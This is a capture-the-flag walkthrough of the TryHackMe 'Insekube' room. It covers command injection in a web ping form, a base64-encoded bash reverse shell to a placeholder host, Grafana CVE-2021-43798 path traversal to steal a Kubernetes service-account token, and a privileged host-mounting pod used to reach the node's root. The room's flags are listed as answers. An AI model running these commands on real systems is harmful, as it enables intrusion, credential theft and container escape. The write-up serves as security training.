# Insekube Walkthrough
### Link
- https://tryhackme.com/room/insekube
---
### Task 1
```
sudo nmap -p- -sS -Pn -n [IP]
```
**Namp scan result**
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9f:ae:04:9e:f0:75:ed:b7:39:80:a0:d8:7f:bd:61:06 (RSA)
|   256 cf:cb:89:62:99:11:d7:ca:cd:5b:57:78:10:d0:6c:82 (ECDSA)
|_  256 5f:11:10:0d:7c:80:a3:fc:d1:d5:43:4e:49:f9:c8:d2 (ED25519)
80/tcp open  http
```
**Question**
#### What ports are open? (comma separated)
**Answer** 
#### 22,80
---
### Task 2
**Question**
#### What is flag 1?
From the website interface, we can send command line.

I tried **whoami**
```
exit status 2
```
I tried **;whoami;**
```
ping: usage error: Destination address required
challenge
```
Let's check the **environment variable** with  **;printenv;** 

**Result**
```
ping: usage error: Destination address required
KUBERNETES_SERVICE_PORT_HTTPS=443
GRAFANA_SERVICE_HOST=10.108.133.228
KUBERNETES_SERVICE_PORT=443
HOSTNAME=syringe-79b66d66d7-7mxhd
SYRINGE_PORT=tcp://10.99.16.179:3000
GRAFANA_PORT=tcp://10.108.133.228:3000
SYRINGE_SERVICE_HOST=10.99.16.179
SYRINGE_PORT_3000_TCP=tcp://10.99.16.179:3000
GRAFANA_PORT_3000_TCP=tcp://10.108.133.228:3000
PWD=/home/challenge
SYRINGE_PORT_3000_TCP_PROTO=tcp
HOME=/home/challenge
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
GOLANG_VERSION=1.15.7
FLAG=flag{5e7cc6165f6c2058b11710a26691bb6b}
SHLVL=1
SYRINGE_PORT_3000_TCP_PORT=3000
GRAFANA_PORT_3000_TCP_PORT=3000
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
GRAFANA_SERVICE_PORT=3000
SYRINGE_PORT_3000_TCP_ADDR=10.99.16.179
SYRINGE_SERVICE_PORT=3000
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
GRAFANA_PORT_3000_TCP_PROTO=tcp
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
GRAFANA_PORT_3000_TCP_ADDR=10.108.133.228
_=/usr/bin/printenv
```
**Answer** 
#### flag{5e7cc6165f6c2058b11710a26691bb6b}
---
Because we can do **RCE** , ley's use this vulnerability to do a **reverse shell**

- First : Convert the command line to **base64**
```
echo -n '/bin/bash -i >& /dev/tcp/[IP]/[Port] 0>&1' | base64
```
- Second : Launch your listener in your local machine
```
nc -nlvp [Port]
```
- Third : send the command from the website
```
;echo [base64 command line]| base64 -d | bash;
```
---
### Task 3

Just Practice ^^
---
### Task 4

First , I tried directly the command **./kubectl get secrets** but I was not in the correct directory. After some research, I found the right directory : **/tmp**
```
challenge@syringe-79b66d66d7-7mxhd:~$ ./kubectl get secrets
./kubectl get secrets
bash: ./kubectl: No such file or directory
```
```
challenge@syringe-79b66d66d7-7mxhd:/tmp$ ls -la
ls -la
total 45504
drwxrwxrwt 1 root root     4096 Jan 30  2022 .
drwxr-xr-x 1 root root     4096 Dec  8 05:59 ..
-rwxrwxr-x 1 root root 46587904 Jan 30  2022 kubectl
```
Let's do one more time the command **./kubectl get secrets**
```
challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get secrets
./kubectl get secrets
NAME                    TYPE                                  DATA   AGE
default-token-8bksk     kubernetes.io/service-account-token   3      335d
developer-token-74lck   kubernetes.io/service-account-token   3      335d
secretflag              Opaque                                1      335d
syringe-token-g85mg     kubernetes.io/service-account-token   3      335d
```
I follow the instruction and the next command line : **./kubectl describe secret secretflag**
```
challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl describe secret secretflag
./kubectl describe secret secretflag
Name:         secretflag
Namespace:    default
Labels:       <none>
Annotations:  <none>

Type:  Opaque

Data
====
flag:  38 bytes
```

We know we have the flag and it size **38 bytes**. From the challenge , they help us :
```
Notice the flag data isn't being outputted with this command, so let's choose the JSON output format with: kubectl get secret secretflag -o 'json'
```
Let's do that
```
challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get secret secretflag -o 'json'
<xhd:/tmp$ ./kubectl get secret secretflag -o 'json'
{
    "apiVersion": "v1",
    "data": {
        "flag": "ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0="
    },
```
Now we can decode the flag
```
 echo 'ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0=' | base64 -d
flag{df2a636de15108a4dc41135d930d8ec1}
```

**Question**
#### What is flag 2?
# Answer : flag{df2a636de15108a4dc41135d930d8ec1}
---
### Task 5

The next instruction **env**
```
challenge@syringe-79b66d66d7-7mxhd:/tmp$ env
env
KUBERNETES_SERVICE_PORT_HTTPS=443
GRAFANA_SERVICE_HOST=10.108.133.228
KUBERNETES_SERVICE_PORT=443
HOSTNAME=syringe-79b66d66d7-7mxhd
SYRINGE_PORT=tcp://10.99.16.179:3000
GRAFANA_PORT=tcp://10.108.133.228:3000
SYRINGE_SERVICE_HOST=10.99.16.179
SYRINGE_PORT_3000_TCP=tcp://10.99.16.179:3000
GRAFANA_PORT_3000_TCP=tcp://10.108.133.228:3000
PWD=/tmp
SYRINGE_PORT_3000_TCP_PROTO=tcp
HOME=/home/challenge
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
LS_COLORS=
GOLANG_VERSION=1.15.7
FLAG=flag{5e7cc6165f6c2058b11710a26691bb6b}
SHLVL=2
SYRINGE_PORT_3000_TCP_PORT=3000
GRAFANA_PORT_3000_TCP_PORT=3000
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
GRAFANA_SERVICE_PORT=3000
SYRINGE_PORT_3000_TCP_ADDR=10.99.16.179
SYRINGE_SERVICE_PORT=3000
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
GRAFANA_PORT_3000_TCP_PROTO=tcp
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
GRAFANA_PORT_3000_TCP_ADDR=10.108.133.228
_=/usr/bin/env
OLDPWD=/home/challenge
```

It is mentionned to check **/login** so let's do a **curl**
```
challenge@syringe-79b66d66d7-7mxhd:/$ curl http://10.108.133.228:3000/login | grep 'version'
<l http://10.108.133.228:3000/login | grep 'version'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 28089    0 28089    0     0  6857k      0 --:--:-- --:--:-- --:--:-- 6857k
          alert('Your browser is not fully supported, please try newer version.');
        settings: {"alertingEnabled":false,"alertingErrorOrTimeout":"alerting","alertingMinInterval":1,"alertingNoDataOrNullValues":"no_data","allowOrgCreate":false,"appSubUrl":"","appUrl":"http://localhost:3000/","applicationInsightsConnectionString":"","applicationInsightsEndpointUrl":"","authProxyEnabled":false,"autoAssignOrg":true,"awsAllowedAuthProviders":["default","keys","credentials"],"awsAssumeRoleEnabled":true,"azure":{"cloud":"AzureCloud","managedIdentityEnabled":false},"buildInfo":{"buildstamp":1637855786,"commit":"8d74cc357","edition":"Enterprise","env":"production","hasUpdate":false,"hideVersion":false,"isEnterprise":false,"latestVersion":"","version":"8.3.0-beta2"},
```
**Question**
#### What is the version of Grafana running on the machine?
# Answer : 8.3.0-beta2

**Question**
#### What is the CVE you've found?

Google : https://nvd.nist.gov/vuln/detail/CVE-2021-43798
# Answer : CVE-2021-43798
---
### Task 6
```
Kubernetes stores the token of the service account running a pod in /var/run/secrets/kubernetes.io/serviceaccount/token.   

Use the LFI vulnerability to extract the token. The token is a JWT signed by the cluster.

Use the --token flag in kubectl to use the new service account. Once again use kubectl to check the permissions of this account.
```

Let's do some research on internet to find something to help us to **CVE-2021-43798 execute kubernetes**
```
A directory path traversal vulnerability was found in Grafana. This flaw allows an attacker to obtain read access to the local files due to a lack of path normalization in the /public/plugins// URL.
```

I found this [link](https://golangexample.com/cve-2021-43798-grafana-8-x-path-traversal-pre-auth/) and that was really helpful to create the **curl** command
```
curl --path-as-is http://localhost:3000/public/plugins/alertlist/../../../../../../../../etc/passwd

```
We just need to replace **localhost** by the appropriate **IP** and **/etc/passwd** with **/var/run/secrets/kubernetes.io/serviceaccount/token**

```
curl --path-as-is http://[IP]:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
```

curl --path-as-is http://10.108.133.228:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token

**Result**
```
curl --path-as-is http://10.108.133.228:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
curl --path-as-is http://10.108.133.228:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzAyMDE5NzU3LCJpYXQiOjE2NzA0ODM3NTcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NzA0ODczNjR9LCJuYmYiOjE2NzA0ODM3NTcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.eMNS46bGcXzeg2B7_BdxaMhnpUQLPfEacPqmiEhOL_nJ9tQxQWwdgCZfWL00pJaJ2W6a4R102T-Q7MEs65mW5uICTozu3VKrMufEwHFWjEAgJfl6FbAGfLkhzsCjUQpMNUBiZ-1ajZSUpfylPNKtzlJ8_oJS3S-6WIvoiQx8vWtw_jTXIYal1O48kilwF7m_9h6MAJWY591NN71MSBUXz9oCiq-Vhe4h63QvHu6rJlV7q5t1JV31ZxKrcnKconOvZ44EKOZDiIshFhFwT-KExCtZx3Ye9asfhEHG2TROeTnbwMxibr6d-O3vwRrimkCnmcL7GC5vvxlw2Jkz5iBU2Q$

```

Now we have the **Token**. We need to decrypt it so let's do that through the website [JWT](https://jwt.io/)
```
{
  "aud": [
    "https://kubernetes.default.svc.cluster.local"
  ],
  "exp": 1702018067,
  "iat": 1670482067,
  "iss": "https://kubernetes.default.svc.cluster.local",
  "kubernetes.io": {
    "namespace": "default",
    "pod": {
      "name": "grafana-57454c95cb-v4nrk",
      "uid": "f2bd173e-b657-4253-a364-e709d731fa12"
    },
    "serviceaccount": {
      "name": "developer",
      "uid": "1967fc30-41b9-42cd-adb7-fab6dae148f6"
    },
    "warnafter": 1670485674
  },
  "nbf": 1670482067,
  "sub": "system:serviceaccount:default:developer"
}

```

**Question**
#### What is the name of the service account running the Grafana service?
# Answer : developer

Let's export the **token value** to the variable **$TOKEN**
```
TOKEN=$(curl --path-as-is http://10.108.133.228:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token)
TOKEN=$(curl --path-as-is http://10.108.133.228:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token)
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1022  100  1022    0     0   499k      0 --:--:-- --:--:-- --:--:--  499k
$ echo $TOKEN
echo $TOKEN
eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzAyMDE5NzU3LCJpYXQiOjE2NzA0ODM3NTcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NzA0ODczNjR9LCJuYmYiOjE2NzA0ODM3NTcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.eMNS46bGcXzeg2B7_BdxaMhnpUQLPfEacPqmiEhOL_nJ9tQxQWwdgCZfWL00pJaJ2W6a4R102T-Q7MEs65mW5uICTozu3VKrMufEwHFWjEAgJfl6FbAGfLkhzsCjUQpMNUBiZ-1ajZSUpfylPNKtzlJ8_oJS3S-6WIvoiQx8vWtw_jTXIYal1O48kilwF7m_9h6MAJWY591NN71MSBUXz9oCiq-Vhe4h63QvHu6rJlV7q5t1JV31ZxKrcnKconOvZ44EKOZDiIshFhFwT-KExCtZx3Ye9asfhEHG2TROeTnbwMxibr6d-O3vwRrimkCnmcL7GC5vvxlw2Jkz5iBU2Q
```
Now let's check how many pods are running
```
./kubectl get pods --token=$TOKEN
./kubectl get pods --token=$TOKEN
NAME                       READY   STATUS    RESTARTS        AGE
grafana-57454c95cb-v4nrk   1/1     Running   10 (311d ago)   335d
syringe-79b66d66d7-7mxhd   1/1     Running   1 (311d ago)    311d
```

**Question**
#### How many pods are running?
# Answer : 2

Now we can try to find the next flag by following the instructions
```
$ ./kubectl exec -it grafana-57454c95cb-v4nrk --token=${TOKEN} -- /bin/bash
./kubectl exec -it grafana-57454c95cb-v4nrk --token=${TOKEN} -- /bin/bash
bash-5.1$ ls -la
ls -la
total 56
drwxr-xr-x    1 root     root          4096 Nov 25  2021 .
drwxr-xr-x    1 root     root          4096 Nov 25  2021 ..
drwxrwxrwx    2 grafana  root          4096 Nov 25  2021 .aws
-rw-r--r--    1 root     root         12155 Nov 25  2021 LICENSE
-rw-r--r--    1 root     root           105 Nov 25  2021 NOTICE.md
-rw-r--r--    1 root     root          2008 Nov 25  2021 README.md
-rw-r--r--    1 root     root            11 Nov 25  2021 VERSION
drwxr-xr-x    2 root     root          4096 Nov 25  2021 bin
drwxr-xr-x    3 root     root          4096 Nov 25  2021 conf
drwxr-xr-x    3 root     root          4096 Nov 25  2021 plugins-bundled
drwxr-xr-x   17 root     root          4096 Nov 25  2021 public
drwxr-xr-x    2 root     root          4096 Nov 25  2021 scripts
bash-5.1$ pwd
pwd
/usr/share/grafana
```
```
bash-5.1$ env
env
KUBERNETES_SERVICE_PORT_HTTPS=443
GRAFANA_SERVICE_HOST=10.108.133.228
KUBERNETES_SERVICE_PORT=443
HOSTNAME=grafana-57454c95cb-v4nrk
SYRINGE_PORT=tcp://10.99.16.179:3000
GRAFANA_PORT=tcp://10.108.133.228:3000
SYRINGE_SERVICE_HOST=10.99.16.179
SYRINGE_PORT_3000_TCP=tcp://10.99.16.179:3000
GRAFANA_PORT_3000_TCP=tcp://10.108.133.228:3000
PWD=/usr/share/grafana
GF_PATHS_HOME=/usr/share/grafana
SYRINGE_PORT_3000_TCP_PROTO=tcp
HOME=/home/grafana
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
FLAG=flag{288232b2f03b1ec422c5dae50f14061f}
TERM=xterm
SHLVL=1
SYRINGE_PORT_3000_TCP_PORT=3000
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GRAFANA_PORT_3000_TCP_PORT=3000
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
GRAFANA_SERVICE_PORT=3000
SYRINGE_PORT_3000_TCP_ADDR=10.99.16.179
SYRINGE_SERVICE_PORT=3000
GF_PATHS_DATA=/var/lib/grafana
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
GF_PATHS_LOGS=/var/log/grafana
GRAFANA_PORT_3000_TCP_PROTO=tcp
PATH=/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GRAFANA_PORT_3000_TCP_ADDR=10.108.133.228
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
```
**Question**
#### What is flag 3?
# Answer : flag{288232b2f03b1ec422c5dae50f14061f}
---
### Task 7 

Visit this [github link](https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml)

Based on the informaiton provided inside the room , add the command line **imagePullPolicy: IfNotPresent**

Create the **yml** file and export it

```
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: ubuntu
    imagePullPolicy: IfNotPresent
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
```

Let's check if the pod has been created
```
$ ./kubectl get pods --token=$TOKEN
./kubectl get pods --token=$TOKEN
NAME                          READY   STATUS    RESTARTS        AGE
everything-allowed-exec-pod   1/1     Running   0               2m46s
grafana-57454c95cb-v4nrk      1/1     Running   10 (311d ago)   335d
syringe-79b66d66d7-7mxhd      1/1     Running   1 (311d ago)    311d
```
```
$ ./kubectl exec -it everything-allowed-exec-pod --token=$TOKEN -- /bin/bash
./kubectl exec -it everything-allowed-exec-pod --token=$TOKEN -- /bin/bash
root@minikube:/#
```

Find the **root.txt**
```
root@minikube:/# find / -type f -name root.txt
find / -type f -name root.txt
find: File system loop detected; '/host/sys/fs/cgroup/freezer/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e' is part of the same file system loop as '/host/sys/fs/cgroup/freezer'.
find: File system loop detected; '/host/sys/fs/cgroup/memory/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e' is part of the same file system loop as '/host/sys/fs/cgroup/memory'.
find: File system loop detected; '/host/sys/fs/cgroup/blkio/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e' is part of the same file system loop as '/host/sys/fs/cgroup/blkio'.
find: File system loop detected; '/host/sys/fs/cgroup/devices/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e' is part of the same file system loop as '/host/sys/fs/cgroup/devices'.
find: File system loop detected; '/host/sys/fs/cgroup/pids/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e' is part of the same file system loop as '/host/sys/fs/cgroup/pids'.
find: File system loop detected; '/host/sys/fs/cgroup/net_cls,net_prio/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e' is part of the same file system loop as '/host/sys/fs/cgroup/net_cls,net_prio'.
find: File system loop detected; '/host/sys/fs/cgroup/perf_event/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e' is part of the same file system loop as '/host/sys/fs/cgroup/perf_event'.
find: File system loop detected; '/host/sys/fs/cgroup/hugetlb/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e' is part of the same file system loop as '/host/sys/fs/cgroup/hugetlb'.
find: File system loop detected; '/host/sys/fs/cgroup/cpu,cpuacct/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e' is part of the same file system loop as '/host/sys/fs/cgroup/cpu,cpuacct'.
find: File system loop detected; '/host/sys/fs/cgroup/cpuset/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e' is part of the same file system loop as '/host/sys/fs/cgroup/cpuset'.
find: File system loop detected; '/host/sys/fs/cgroup/systemd/docker/8b3aa3e54588c392fb08435e932ed905ad3080307c7d5dcb53fd024673de5f9e' is part of the same file system loop as '/host/sys/fs/cgroup/systemd'.
find: File system loop detected; '/host/var/lib/docker/overlay2/21e4b817e49687e5c0e33a4570aaf68d633164e207748677c9d27d2b1b669a20/merged' is part of the same file system loop as '/'.
/host/root/root.txt
```
```
root@minikube:/# cat /host/root/root.txt
cat /host/root/root.txt
flag{30180a273e7da821a7fe4af22ffd1701}
```
**Question**
#### What is root.txt?
# Answer : flag{30180a273e7da821a7fe4af22ffd1701}
